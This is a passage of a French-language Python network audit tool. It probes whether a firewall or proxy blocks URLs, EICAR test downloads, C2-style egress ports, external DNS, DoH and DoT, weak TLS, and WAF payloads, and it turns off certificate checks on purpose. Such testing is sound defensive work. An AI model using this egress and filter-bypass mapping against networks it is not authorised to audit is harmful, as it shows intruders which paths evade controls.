                chunk = sock.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
        head, _, body = buf.partition(b"\r\n\r\n")
        lines = head.decode("latin-1", "ignore").split("\r\n")
        if lines and lines[0].startswith("HTTP/"):
            parts = lines[0].split()
            if len(parts) > 1 and parts[1].isdigit():
                out["status"] = int(parts[1])
        for ln in lines[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1)
                out["headers"][k.strip().lower()] = v.strip()
        out["body"] = body.decode("utf-8", "ignore")
        out["state"] = "ok" if out["status"] else "no_http"
    except ssl.SSLError as e:
        out["state"] = "tls_error"; out["error"] = str(e)[:110]
    except (ConnectionResetError, socket.timeout) as e:
        out["state"] = "reset"; out["error"] = str(e)[:110]
    except Exception as e:
        out["state"] = "error"; out["error"] = str(e)[:110]
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return out

def classify_raw_probe(p, domain):
    """Traduit une sonde brute en (observed, confidence, details, evidence)."""
    st = p["state"]
    if st == "ok":
        low = (p["body"] or "").lower()
        vendor = detect_vendor(low, p["headers"])
        if vendor:
            return (OBS_BLOCKED, CONF_CERTAIN, f"Bloqué par {vendor}",
                    "Page de filtrage renvoyée sur la connexion directe")
        if detect_block_phrase(low):
            return (OBS_BLOCKED, CONF_CERTAIN, f"Page de blocage (HTTP {p['status']})",
                    "Le contenu renvoyé est une page de filtrage")
        return (OBS_ALLOWED, CONF_CERTAIN, f"HTTP {p['status']} obtenu en direct",
                f"Connexion établie sans passer par le nom de domaine : "
                f"{len(p['body'])} octets reçus (Host: {domain})")
    if st == "tls_error":
        return (OBS_ALLOWED, CONF_PROBABLE, "Connexion TCP acceptée, TLS refusé par le serveur",
                f"La sortie réseau vers cette adresse est autorisée ; le refus vient du serveur "
                f"({p['error'][:70]})")
    if st in ("no_http", "reset"):
        return (OBS_BLOCKED, CONF_PROBABLE, "Session coupée après connexion",
                p["error"] or "aucune réponse HTTP exploitable")
    if st == "timeout":
        return (OBS_BLOCKED, CONF_CERTAIN, "Aucune réponse (DROP)",
                "Rejet silencieux de la connexion directe par IP")
    if st == "refused":
        return (OBS_BLOCKED, CONF_PROBABLE, "Connexion refusée (RST)",
                "Refus immédiat de la connexion directe par IP")
    if st == "unreachable":
        return (OBS_BLOCKED, CONF_CERTAIN, "Réseau injoignable",
                "Aucune route vers cette adresse")
    return (OBS_INCONCLUSIVE, CONF_WEAK, "Sonde en erreur", p.get("error", ""))

def classify_http_error(exc, host=""):
    """Traduit une exception requests en observation."""
    msg = str(exc)
    low = msg.lower()

    if isinstance(exc, requests.exceptions.ProxyError):
        return (OBS_INCONCLUSIVE, CONF_PROBABLE, "Erreur proxy",
                f"Le proxy a refusé ou interrompu la requête : {msg[:120]}")
    if isinstance(exc, requests.exceptions.SSLError):
        if "certificate verify failed" in low or "self signed" in low or "unable to get local issuer" in low:
            return (OBS_BLOCKED, CONF_PROBABLE, "Handshake TLS rejeté (certificat)",
                    "Certificat non validé : interception TLS ou substitution par un équipement")
        return (OBS_BLOCKED, CONF_PROBABLE, "Erreur TLS",
                f"Négociation TLS interrompue : {msg[:120]}")
    if isinstance(exc, requests.exceptions.TooManyRedirects):
        return (OBS_INCONCLUSIVE, CONF_PROBABLE, "Boucle de redirection", msg[:120])
    if isinstance(exc, requests.exceptions.ReadTimeout):
        return (OBS_INCONCLUSIVE, CONF_WEAK, "Délai de lecture dépassé",
                "Le serveur a répondu puis s'est tu : lenteur ou coupure en cours de session")
    if isinstance(exc, (requests.exceptions.ConnectTimeout, requests.exceptions.Timeout)):
        return (OBS_BLOCKED, CONF_PROBABLE, "Délai de connexion dépassé",
                "Aucune réponse au SYN : signature d'un rejet silencieux (DROP)")
    if isinstance(exc, requests.exceptions.ConnectionError):
        if "getaddrinfo failed" in low or "name or service not known" in low \
           or "nodename nor servname" in low or "name resolution" in low or "11001" in low:
            return (OBS_BLOCKED, CONF_CERTAIN, "Résolution DNS impossible",
                    "Le nom n'est pas résolu : filtrage DNS ou domaine inexistant")
        if "refused" in low or "10061" in low:
            return (OBS_BLOCKED, CONF_PROBABLE, "Connexion refusée (RST)",
                    "Refus immédiat : rejet du pare-feu ou service absent")
        if "reset" in low or "10054" in low or "aborted" in low:
            return (OBS_BLOCKED, CONF_CERTAIN, "Connexion réinitialisée",
                    "RST en cours de session : coupure typique d'un IPS/proxy")
        if "timed out" in low or "timeout" in low:
            return (OBS_BLOCKED, CONF_PROBABLE, "Délai dépassé",
                    "Rejet silencieux probable")
        if "unreachable" in low or "10051" in low or "10065" in low:
            return (OBS_BLOCKED, CONF_CERTAIN, "Réseau/hôte injoignable",
                    "Aucune route : filtrage ou absence de connectivité")
        return (OBS_BLOCKED, CONF_WEAK, "Échec de connexion", msg[:120])
    return (OBS_INCONCLUSIVE, CONF_WEAK, "Erreur inattendue", msg[:120])

# ── TCP ───────────────────────────────────────────────────────────────────────

def tcp_probe(host, port, timeout=TCP_TO, read_banner=False):
    """
    Sonde TCP. Retourne dict(state, detail, banner, elapsed_ms).
    state ∈ open | refused | timeout | unreachable | dns_error | error
    """
    t0 = time.time()
    out = {"state": "error", "detail": "", "banner": "", "elapsed_ms": 0}
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        out["state"] = "open"
        if read_banner:
            try:
                s.settimeout(3)
                out["banner"] = s.recv(160).decode("utf-8", errors="ignore").strip()
            except Exception:
                out["banner"] = ""
        s.close()
    except socket.gaierror as e:
        out["state"] = "dns_error"; out["detail"] = str(e)[:100]
    except socket.timeout:
        out["state"] = "timeout"; out["detail"] = "aucune réponse au SYN"
    except ConnectionRefusedError:
        out["state"] = "refused"; out["detail"] = "RST reçu"
    except OSError as e:
        err = getattr(e, "errno", None)
        low = str(e).lower()
        if "unreachable" in low or err in (101, 113, 10051, 10065):
            out["state"] = "unreachable"
        elif "timed out" in low or err in (110, 10060):
            out["state"] = "timeout"
        elif "refused" in low or err in (111, 10061):
            out["state"] = "refused"
        else:
            out["state"] = "error"
        out["detail"] = str(e)[:100]
    out["elapsed_ms"] = round((time.time() - t0) * 1000)
    return out

# ── DNS brut (UDP/TCP, sans dépendance) ───────────────────────────────────────

QTYPE = {"A": 1, "NS": 2, "CNAME": 5, "SOA": 6, "PTR": 12, "MX": 15, "TXT": 16, "AAAA": 28}
RCODE = {0: "NOERROR", 1: "FORMERR", 2: "SERVFAIL", 3: "NXDOMAIN", 4: "NOTIMP", 5: "REFUSED"}

def _dns_encode_name(name):
    out = b""
    for label in name.rstrip(".").split("."):
        lb = label.encode("idna") if any(ord(c) > 127 for c in label) else label.encode("ascii", "ignore")
        out += bytes([len(lb)]) + lb
    return out + b"\x00"

def _dns_parse_name(buf, off):
    parts, jumped, safety = [], False, 0
    start_off = off
    while safety < 64:
        safety += 1
        if off >= len(buf):
            break
        ln = buf[off]
        if ln == 0:
            off += 1
            break
        if ln & 0xC0 == 0xC0:                      # pointeur de compression
            ptr = ((ln & 0x3F) << 8) | buf[off + 1]
            if not jumped:
                start_off = off + 2
            jumped, off = True, ptr
            continue
        parts.append(buf[off + 1: off + 1 + ln].decode("ascii", "ignore"))
        off += 1 + ln
    return ".".join(parts), (start_off if jumped else off)

def dns_query(qname, qtype="A", server=None, timeout=4, tcp=False):
    """Requête DNS brute. Retourne dict(ok, rcode, answers, error, elapsed_ms)."""
    res = {"ok": False, "rcode": "", "answers": [], "error": "", "elapsed_ms": 0,
           "server": server or "système"}
    qt = QTYPE.get(qtype.upper(), 1)
    tid = random.randint(0, 0xFFFF)
    payload = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0) + _dns_encode_name(qname) + struct.pack(">HH", qt, 1)
    t0 = time.time()
    try:
        if tcp:
            s = socket.create_connection((server, 53), timeout=timeout)
            s.sendall(struct.pack(">H", len(payload)) + payload)
            head = s.recv(2)
            if len(head) < 2:
                raise socket.timeout("réponse tronquée")
            need = struct.unpack(">H", head)[0]
            data = b""
            while len(data) < need:
                chunk = s.recv(need - len(data))
                if not chunk:
                    break
                data += chunk
            s.close()
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(payload, (server, 53))
            data, _ = s.recvfrom(4096)
            s.close()
        rid, flags, qd, an, ns, ar = struct.unpack(">HHHHHH", data[:12])
        res["rcode"] = RCODE.get(flags & 0x0F, str(flags & 0x0F))
        off = 12
        for _ in range(qd):
            _, off = _dns_parse_name(data, off)
            off += 4
        for _ in range(an):
            _, off = _dns_parse_name(data, off)
            rtype, rclass, ttl, rdlen = struct.unpack(">HHIH", data[off:off + 10])
            off += 10
            rdata = data[off:off + rdlen]
            if rtype == 1 and rdlen == 4:
                res["answers"].append(socket.inet_ntoa(rdata))
            elif rtype == 28 and rdlen == 16:
                res["answers"].append(socket.inet_ntop(socket.AF_INET6, rdata))
            elif rtype == 16:
                txt, p = [], 0
                while p < rdlen:
                    ln = rdata[p]; txt.append(rdata[p + 1:p + 1 + ln].decode("utf-8", "ignore")); p += 1 + ln
                res["answers"].append(" ".join(txt))
            elif rtype in (5, 2, 12):
                nm, _ = _dns_parse_name(data, off)
                res["answers"].append(nm)
            off += rdlen
        res["ok"] = True
    except socket.timeout:
        res["error"] = "timeout"
    except Exception as e:
        res["error"] = str(e)[:100]
    res["elapsed_ms"] = round((time.time() - t0) * 1000)
    return res

def system_dns_servers():
    """Serveurs DNS configurés sur le poste."""
    servers = []
    try:
        if platform.system() == "Windows":
            out = subprocess.run(["ipconfig", "/all"], capture_output=True, timeout=12,
                                 text=True, errors="ignore").stdout
            grab = False
            for line in out.splitlines():
                if re.search(r"DNS[^:]*:", line, re.I) and ("serv" in line.lower() or "server" in line.lower()):
                    grab = True
                    m = re.search(r":\s*([0-9a-fA-F:.]+)\s*$", line)
                    if m:
                        servers.append(m.group(1))
                    continue
                if grab:
                    m = re.match(r"^\s{6,}([0-9a-fA-F:.]+)\s*$", line)
                    if m:
                        servers.append(m.group(1))
                    else:
                        grab = False
        else:
            with open("/etc/resolv.conf", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    m = re.match(r"\s*nameserver\s+(\S+)", line)
                    if m:
                        servers.append(m.group(1))
    except Exception:
        pass
    clean = []
    for s in servers:
        try:
            ipaddress.ip_address(s)
            if s not in clean:
                clean.append(s)
        except ValueError:
            continue
    return clean

# ── Certificats : détection d'interception TLS ────────────────────────────────

def _der_first_rdn(der, oid):
    """Extrait la première valeur d'un RDN (l'émetteur précède le sujet)."""
    idx = der.find(oid)
    if idx < 0:
        return ""
    p = idx + len(oid)
    if p + 2 > len(der):
        return ""
    tag, ln = der[p], der[p + 1]
    if tag not in (0x0C, 0x13, 0x16, 0x14, 0x1E) or ln > 128:
        return ""
    return der[p + 2:p + 2 + ln].decode("utf-8", "ignore")

OID_O  = bytes([0x06, 0x03, 0x55, 0x04, 0x0A])
OID_CN = bytes([0x06, 0x03, 0x55, 0x04, 0x03])

def peer_cert_issuer(host, port=443, timeout=CONNECT_TO):
    """
    Retourne (issuer, trusted, erreur).
    trusted = le certificat a été validé par le magasin du système.
    """
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as s:
                cert = s.getpeercert() or {}
                issuer = dict(x[0] for x in cert.get("issuer", ()) if x)
                name = issuer.get("organizationName") or issuer.get("commonName") or ""
                return name, True, ""
    except ssl.SSLError as e:
        pass
    except Exception as e:
        return "", False, str(e)[:100]
    # Non validé : on récupère quand même l'émetteur en DER.
    try:
        ctx = ssl._create_unverified_context()
        with socket.create_connection((host, port), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as s:
                der = s.getpeercert(binary_form=True) or b""
        name = _der_first_rdn(der, OID_O) or _der_first_rdn(der, OID_CN)
        return name, False, "certificat non validé par le magasin système"
    except Exception as e:
        return "", False, str(e)[:100]

def looks_public_ca(issuer):
    low = (issuer or "").lower()
    return any(h in low for h in PUBLIC_CA_HINTS)

# ═══════════════════════════════════════════════════════════════════════════════
# MESURES DE CONTRÔLE (baseline)
# ═══════════════════════════════════════════════════════════════════════════════

BASELINE = {
    "internet": False, "https_ok": False, "http_plain": False,
    "proxy_auth_required": False, "tls_inspection": None, "tls_issuer": "",
    "portquiz": False, "echo": "", "echoes": [], "dns_servers": [], "notes": [],
}

def run_baseline(log=print):
    """Sans ces contrôles, aucun verdict de blocage n'est fiable."""
    b = BASELINE
    b["dns_servers"] = system_dns_servers()

    resp, body, err = http_get("https://www.google.com/generate_204", read_body=True)
    if resp is not None:
        b["https_ok"] = True
        b["internet"] = True
        if resp.status_code == 407:
            b["proxy_auth_required"] = True
            b["notes"].append("Le proxy exige une authentification (HTTP 407) : les résultats seront non concluants.")
    else:
        resp2, _, err2 = http_get("https://www.microsoft.com", read_body=False)
        if resp2 is not None:
            b["https_ok"] = True
            b["internet"] = True
        else:
            b["notes"].append(f"Aucune sortie HTTPS détectée ({type(err).__name__}) : audit non exploitable.")

    resp, body, err = http_get("http://detectportal.firefox.com/success.txt", read_body=True)
    if resp is not None and resp.status_code == 200 and "success" in (body or "").lower():
        b["http_plain"] = True
    elif resp is not None:
        b["notes"].append("La sortie HTTP en clair est interceptée (proxy explicite ou transparent).")

    issuer, trusted, cerr = peer_cert_issuer("www.google.com")
    b["tls_issuer"] = issuer
    if issuer:
        b["tls_inspection"] = not looks_public_ca(issuer)
        if b["tls_inspection"]:
            b["notes"].append(f"Interception TLS active : certificat émis par « {issuer} ».")
    elif cerr:
        b["notes"].append(f"Certificat de contrôle illisible ({cerr}).")

    pq = tcp_probe(PORTQUIZ_HOST, 80, timeout=5)
    b["portquiz"] = pq["state"] == "open"
    if not b["portquiz"]:
        b["notes"].append(f"{PORTQUIZ_HOST}:80 injoignable ({pq['state']}) : "
                          "les tests de ports seront non concluants ou attribués au filtrage.")

    b["echoes"] = []
    for base in ECHO_ENDPOINTS:
        r, _, _ = http_get(base + "/get", read_body=False)
        if r is not None and r.status_code < 400:
            b["echoes"].append(base)
    b["echo"] = b["echoes"][0] if b["echoes"] else ""
    if not b["echo"]:
        b["notes"].append("Aucun point d'écho HTTP disponible : modules WAF et upload non concluants.")
    return b

# ═══════════════════════════════════════════════════════════════════════════════
# EXÉCUTEURS DE TESTS
# ═══════════════════════════════════════════════════════════════════════════════

def _downgrade_if_no_internet(r):
    """Sans connectivité de référence, un « bloqué » ne prouve rien."""
    if not BASELINE["internet"] and r["observed"] == OBS_BLOCKED:
        r["observed"]   = OBS_INCONCLUSIVE
        r["confidence"] = CONF_WEAK
        r["evidence"]   = (r["evidence"] + " | ").lstrip(" |") + \
                          "Aucune connectivité de référence : verdict non exploitable"
    return r

def _http_observe(r, url, host, headers=None, method="GET", **kw):
    """Effectue la requête, remplit l'observation et retourne le corps reçu."""
    resp, body, err = http_get(url, headers=headers, method=method, **kw)
    if err is not None:
        obs, conf, det, ev = classify_http_error(err, host)
        set_obs(r, obs, conf, det, ev)
    else:
        r["http_code"] = resp.status_code
        obs, conf, det, ev, vendor = classify_http(resp, body, host)
        set_obs(r, obs, conf, det, ev, vendor)
        r["extra"]["final_url"] = resp.url[:200]
    _downgrade_if_no_internet(r)
    return body

# ── URL / politique web ───────────────────────────────────────────────────────

def run_url_test(name, url, category, source, policy=None):
    t0 = time.time()
    host = urlparse(url).hostname or ""
    r = new_result("url", name, url, category=category,
                   expected=category_expected(category, policy), source=source)
    # Résolution préalable : distingue un filtrage DNS d'un filtrage HTTP.
    if not PROXIES:
        ips, dns_err = resolve_host(host)
        r["extra"]["ips"] = ips[:4]
        if not ips and dns_err:
            set_obs(r, OBS_BLOCKED, CONF_CERTAIN, "Non résolu (DNS)",
                    f"Le résolveur ne renvoie aucune adresse pour {host} : filtrage DNS ou domaine mort")
            return finalize(_downgrade_if_no_internet(r), t0)
        if ips and all(is_sinkholed(ip) for ip in ips):
            set_obs(r, OBS_BLOCKED, CONF_CERTAIN, "Redirigé vers un puits DNS (sinkhole)",
                    f"{host} → {', '.join(ips[:3])} : adresse de blocage connue")
            return finalize(_downgrade_if_no_internet(r), t0)
    _http_observe(r, url, host)
    return finalize(r, t0)

# ── EICAR / analyse de contenu ────────────────────────────────────────────────

def run_eicar_test(name, url, description):
    t0 = time.time()
    host = urlparse(url).hostname or ""
    r = new_result("eicar", name, url, category="malware",
                   expected=EXPECT_BLOCKED, description=description,
                   source="EICAR / AMTSO (fichier de test antivirus)")
    try:
        resp = requests.get(url, headers={"User-Agent": UA_BROWSER, "Accept": "*/*"},
                            proxies=PROXIES, verify=False, stream=True,
                            timeout=(CONNECT_TO, READ_TO), allow_redirects=True)
    except Exception as err:
        obs, conf, det, ev = classify_http_error(err, host)
        set_obs(r, obs, conf, det, ev)
        return finalize(_downgrade_if_no_internet(r), t0)

    r["http_code"] = resp.status_code
    raw = b""
    try:
        for chunk in resp.iter_content(4096):
            raw += chunk
            if len(raw) > 32768:
                break
    except Exception as e:
        set_obs(r, OBS_BLOCKED, CONF_PROBABLE, "Transfert interrompu",
                f"Coupure pendant le téléchargement : {str(e)[:90]}")
        return finalize(_downgrade_if_no_internet(r), t0)
    finally:
        resp.close()

    text = raw.decode("utf-8", errors="ignore")
    vendor = detect_vendor(text.lower(), {k.lower(): v for k, v in resp.headers.items()})
    r["extra"]["bytes"] = len(raw)

    if contains_eicar(raw):
        set_obs(r, OBS_ALLOWED, CONF_CERTAIN, "Charge EICAR reçue intégralement",
                f"Signature EICAR présente dans les {len(raw)} octets téléchargés — aucune analyse de contenu",
                vendor)
    elif url.endswith(".zip") and raw[:2] == b"PK":
        set_obs(r, OBS_ALLOWED, CONF_CERTAIN, "Archive EICAR reçue",
                f"Archive ZIP de {len(raw)} octets délivrée sans blocage", vendor)
    elif vendor or detect_block_phrase(text.lower()):
        set_obs(r, OBS_BLOCKED, CONF_CERTAIN,
                f"Remplacé par une page de blocage{' (' + vendor + ')' if vendor else ''}",
                "Le contenu renvoyé est une page de filtrage, pas le fichier demandé", vendor)
    elif resp.status_code in (403, 406, 451):
        set_obs(r, OBS_BLOCKED, CONF_CERTAIN, f"HTTP {resp.status_code} — téléchargement refusé",
                "Refus explicite sur la requête de téléchargement", vendor)
    elif resp.status_code in (404, 410):
        set_obs(r, OBS_INCONCLUSIVE, CONF_PROBABLE, f"HTTP {resp.status_code} — ressource absente",
                "Le fichier de test n'est plus publié à cette adresse", vendor)
    else:
        set_obs(r, OBS_BLOCKED, CONF_PROBABLE,
                f"HTTP {resp.status_code} sans charge EICAR ({len(raw)} octets)",
                "Le fichier a été neutralisé ou tronqué en transit", vendor)
    return finalize(_downgrade_if_no_internet(r), t0)

# ── C2 / egress TCP ───────────────────────────────────────────────────────────

def _tcp_observe(r, host, port, banner_expect="", read_banner=False):
    p = tcp_probe(host, port, read_banner=read_banner or bool(banner_expect))
    r["extra"]["tcp_state"] = p["state"]
    if p["banner"]:
        r["extra"]["banner"] = p["banner"][:120]

    if p["state"] == "open":
        if banner_expect:
            if p["banner"].startswith(banner_expect) or banner_expect in p["banner"]:
                set_obs(r, OBS_ALLOWED, CONF_CERTAIN,
                        f"Ouvert — service confirmé : {p['banner'][:60]}",
                        "Bannière applicative reçue : le protocole traverse réellement le pare-feu")
            elif p["banner"]:
                set_obs(r, OBS_ALLOWED, CONF_PROBABLE,
                        f"Ouvert — bannière inattendue : {p['banner'][:60]}",
                        "TCP établi mais réponse non conforme : interception applicative possible")
            else:
                set_obs(r, OBS_ALLOWED, CONF_PROBABLE, "TCP établi, aucune bannière",
                        "La session TCP passe mais le service ne répond pas : proxy transparent probable")
        else:
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN, f"Port {port} joignable",
                    f"Connexion TCP établie en {p['elapsed_ms']} ms")
    elif p["state"] == "refused":
        set_obs(r, OBS_BLOCKED, CONF_PROBABLE, "Connexion refusée (RST)",
                "RST immédiat : rejet du pare-feu, ou service absent côté destination")
    elif p["state"] == "timeout":
        set_obs(r, OBS_BLOCKED, CONF_CERTAIN, "Aucune réponse (DROP)",
                "Rejet silencieux : comportement standard d'une règle DENY")
    elif p["state"] == "unreachable":
        set_obs(r, OBS_BLOCKED, CONF_CERTAIN, "Hôte/réseau injoignable",
                "Absence de route : filtrage ou routage volontairement restreint")
    elif p["state"] == "dns_error":
        set_obs(r, OBS_BLOCKED, CONF_CERTAIN, "Nom non résolu",
                "Filtrage DNS en amont de la connexion")
    else:
        set_obs(r, OBS_INCONCLUSIVE, CONF_WEAK, "Sonde en erreur", p["detail"])
    return _downgrade_if_no_internet(r)

def run_c2_test(name, host, port, category, expected, description):
    t0 = time.time()
    r = new_result("c2", name, f"{host}:{port}", category=category,
                   expected=expected, description=description)
    _tcp_observe(r, host, port)
    # portquiz répond sur tous les ports : un refus y est nécessairement réseau.
    if host == PORTQUIZ_HOST and r["observed"] == OBS_BLOCKED and BASELINE["portquiz"]:
        r["confidence"] = CONF_CERTAIN
        r["evidence"] += " | L'hôte de test écoute sur tous les ports : le refus vient du réseau"
    return finalize(r, t0)

# ── DNS ───────────────────────────────────────────────────────────────────────

def _system_resolve_detail(domain):
    """Résolution via le résolveur du poste, avec rcode si possible."""
    srv = BASELINE["dns_servers"][0] if BASELINE["dns_servers"] else None
    if srv:
        q = dns_query(domain, "A", server=srv)
        if q["ok"] or q["error"]:
            return q
    ips, err = resolve_host(domain)
    return {"ok": bool(ips), "rcode": "NOERROR" if ips else "NXDOMAIN",
            "answers": ips, "error": err, "elapsed_ms": 0, "server": "getaddrinfo"}

def run_dns_test(test):
    t0 = time.time()
    kind = test["kind"]
    r = new_result("dns", test["name"], test["target"], category=test.get("category", ""),
                   expected=test.get("expected", EXPECT_BLOCKED),
                   description=test.get("description", ""))

    if kind == "resolve":
        q = _system_resolve_detail(test["target"])
        r["extra"]["rcode"] = q.get("rcode", "")
        r["extra"]["ips"] = q.get("answers", [])[:4]
        ips = [a for a in q.get("answers", []) if re.match(r"^[0-9a-fA-F:.]+$", str(a))]
        if not q["ok"] and q.get("error"):
            set_obs(r, OBS_INCONCLUSIVE, CONF_WEAK, f"Requête en échec : {q['error']}",
                    f"Serveur interrogé : {q.get('server')}")
        elif q.get("rcode") == "NXDOMAIN":
            set_obs(r, OBS_BLOCKED, CONF_PROBABLE, "NXDOMAIN",
                    "Le résolveur nie l'existence du domaine (filtrage ou domaine mort)")
        elif q.get("rcode") == "REFUSED":
            set_obs(r, OBS_BLOCKED, CONF_CERTAIN, "REFUSED",
                    "Le résolveur refuse explicitement la requête")
        elif ips and all(is_sinkholed(ip) for ip in ips):
            set_obs(r, OBS_BLOCKED, CONF_CERTAIN, f"Puits DNS → {', '.join(ips[:3])}",
                    "Réponse détournée vers une adresse de blocage connue")
        elif ips:
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN, f"Résolu → {', '.join(ips[:3])}",
                    f"Réponse authentique du résolveur ({q.get('server')})")
        else:
            set_obs(r, OBS_INCONCLUSIVE, CONF_WEAK, "Aucune réponse exploitable", "")

    elif kind in ("udp53", "tcp53"):
        q = dns_query("example.com", "A", server=test["target"], tcp=(kind == "tcp53"))
        proto = "TCP" if kind == "tcp53" else "UDP"
        if q["ok"] and q["answers"]:
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN,
                    f"Résolveur externe joignable en {proto}/53",
                    f"{test['target']} a répondu {q['answers'][0]} en {q['elapsed_ms']} ms — "
                    "le filtrage DNS interne est contournable")
        elif q["error"] == "timeout":
            set_obs(r, OBS_BLOCKED, CONF_CERTAIN, f"{proto}/53 sortant filtré",
                    "Aucune réponse du résolveur externe : sortie DNS restreinte")
        else:
            set_obs(r, OBS_BLOCKED, CONF_PROBABLE, f"{proto}/53 sortant indisponible",
                    q["error"] or "réponse invalide")

    elif kind == "doh":
        url = test["target"]
        sep = "&" if "?" in url else "?"
        resp, body, err = http_get(f"{url}{sep}name=example.com&type=A",
                                   headers={"Accept": "application/dns-json"})
        if err is not None:
            obs, conf, det, ev = classify_http_error(err, urlparse(url).hostname or "")
            set_obs(r, obs, conf, "DoH — " + det, ev)
        else:
            r["http_code"] = resp.status_code
            if resp.status_code == 200 and ("answer" in (body or "").lower() or "status" in (body or "").lower()):
                set_obs(r, OBS_ALLOWED, CONF_CERTAIN, "DoH fonctionnel",
                        "Résolution DNS complète par-dessus HTTPS : tout filtrage DNS est contourné")
            else:
                obs, conf, det, ev, vendor = classify_http(resp, body, urlparse(url).hostname or "")
                set_obs(r, obs, conf, "DoH — " + det, ev, vendor)

    elif kind == "dot":
        p = tcp_probe(test["target"], 853)
        if p["state"] == "open":
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN, "DoT (853) joignable",
                    "Le port DNS over TLS est ouvert en sortie : filtrage DNS contournable")
        else:
            set_obs(r, OBS_BLOCKED, CONF_CERTAIN, f"DoT (853) filtré ({p['state']})",
                    p["detail"] or "port fermé en sortie")

    return finalize(_downgrade_if_no_internet(r), t0)

# ── SSL / TLS ─────────────────────────────────────────────────────────────────

def tls_handshake(host, port, force_version=None, weak_ciphers=False, timeout=CONNECT_TO):
    """Handshake sans validation. Retourne dict(ok, issuer, version, cipher, error, local)."""
    out = {"ok": False, "issuer": "", "version": "", "cipher": "", "error": "", "local": False}
    try:
        ctx = ssl._create_unverified_context()
        if force_version is not None:
            try:
                ctx.minimum_version = force_version
                ctx.maximum_version = force_version
            except (ValueError, AttributeError) as e:
                out["error"] = f"version TLS non supportée localement : {e}"
                out["local"] = True
                return out
        if weak_ciphers or force_version is not None:
            for spec in ("DEFAULT@SECLEVEL=0", "ALL:@SECLEVEL=0", "DEFAULT"):
                try:
                    ctx.set_ciphers(spec)
                    break
                except ssl.SSLError:
                    continue
        with socket.create_connection((host, port), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as s:
                out["ok"] = True
                out["version"] = s.version() or ""
                c = s.cipher()
                out["cipher"] = c[0] if c else ""
                der = s.getpeercert(binary_form=True) or b""
                out["issuer"] = _der_first_rdn(der, OID_O) or _der_first_rdn(der, OID_CN)
    except ssl.SSLError as e:
        msg = str(e).lower()
        out["error"] = str(e)[:140]
        out["local"] = any(k in msg for k in ("no protocols available", "unsupported protocol",
                                              "wrong version number", "no cipher", "sslv3 alert handshake failure"))
    except Exception as e:
        out["error"] = str(e)[:140]
    return out

def run_ssl_test(name, host, port, kind, expected, description):
    t0 = time.time()
    r = new_result("ssl", name, f"{host}:{port}", category="malware" if kind != "valid" else "neutral",
                   expected=expected, description=description)
    r["category"] = "ssl_" + kind

    p = tcp_probe(host, port)
    r["extra"]["tcp_state"] = p["state"]
    if p["state"] != "open":
        if kind == "valid":
            set_obs(r, OBS_BLOCKED, CONF_CERTAIN, f"Connexion impossible ({p['state']})",
                    "Un site de référence devrait être joignable : filtrage ou coupure réseau")
        else:
            set_obs(r, OBS_BLOCKED, CONF_CERTAIN, f"Connexion coupée avant TLS ({p['state']})",
                    "Le pare-feu ferme la session avant la négociation TLS")
        return finalize(_downgrade_if_no_internet(r), t0)

    force = None
    if kind == "old_tls":
        force = ssl.TLSVersion.TLSv1 if "1-0" in host else ssl.TLSVersion.TLSv1_1
    hs = tls_handshake(host, port, force_version=force, weak_ciphers=(kind in ("weak_cipher", "weak_key")))
    r["extra"].update({"tls_version": hs["version"], "cipher": hs["cipher"], "issuer": hs["issuer"]})

    if hs["local"]:
        set_obs(r, OBS_INCONCLUSIVE, CONF_CERTAIN, "Non testable depuis ce poste",
                f"La bibliothèque TLS locale refuse cette configuration ({hs['error'][:70]}) : "
                "impossible de savoir si le pare-feu l'aurait bloquée")
        return finalize(r, t0)

    if kind == "valid":
        if hs["ok"]:
            mitm = bool(hs["issuer"]) and not looks_public_ca(hs["issuer"])
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN,
                    f"{hs['version']} / {hs['cipher']}",
                    f"Émetteur : {hs['issuer'] or 'inconnu'}" +
                    (" — interception TLS d'entreprise" if mitm else ""))
            if mitm:
                r["extra"]["mitm"] = True
        else:
            set_obs(r, OBS_BLOCKED, CONF_PROBABLE, "Handshake TLS refusé", hs["error"])
        return finalize(_downgrade_if_no_internet(r), t0)

    if not hs["ok"]:
        set_obs(r, OBS_BLOCKED, CONF_CERTAIN, "Handshake interrompu",
                f"L'équipement intermédiaire refuse de relayer ce certificat ({hs['error'][:80]})")
        return finalize(_downgrade_if_no_internet(r), t0)

    issuer = hs["issuer"] or ""
    if BASELINE.get("tls_inspection") and issuer and issuer == BASELINE.get("tls_issuer"):
        set_obs(r, OBS_ALLOWED, CONF_CERTAIN,
                "Certificat invalide ré-émis par le proxy",
                f"L'inspection TLS est active (« {issuer} ») et a signé un certificat invalide "
                "au lieu de bloquer la session : défaut de configuration")
    else:
        set_obs(r, OBS_ALLOWED, CONF_CERTAIN,
                f"Certificat invalide accepté ({hs['version']})",
                f"Le flux atteint le serveur ; émetteur d'origine « {issuer or 'inconnu'} » — "
                "aucun contrôle de certificat côté réseau")
    return finalize(_downgrade_if_no_internet(r), t0)

# ── Couche applicative (WAF / IPS) ────────────────────────────────────────────

def run_app_test(test, echo_base):
    from urllib.parse import quote
    t0 = time.time()
    r = new_result("app", test["name"], echo_base, category="exploit",
                   expected=test["expected"], description=test.get("description", ""),
                   source="Point d'écho contrôlé (le refus ne peut venir que d'un intermédiaire)")
    if not echo_base:
        set_obs(r, OBS_INCONCLUSIVE, CONF_CERTAIN, "Aucun point d'écho disponible",
                "Impossible d'isoler le comportement du WAF sans serveur témoin")
        return finalize(r, t0)

    kind = test["kind"]
    # value peut être une chaîne, ou un tuple de fragments à recomposer.
    val = test["value"]
    payload = "".join(val) if isinstance(val, tuple) else val
    bases = [echo_base] + [b for b in BASELINE.get("echoes", []) if b != echo_base]
    body = ""
    for base in bases[:2]:
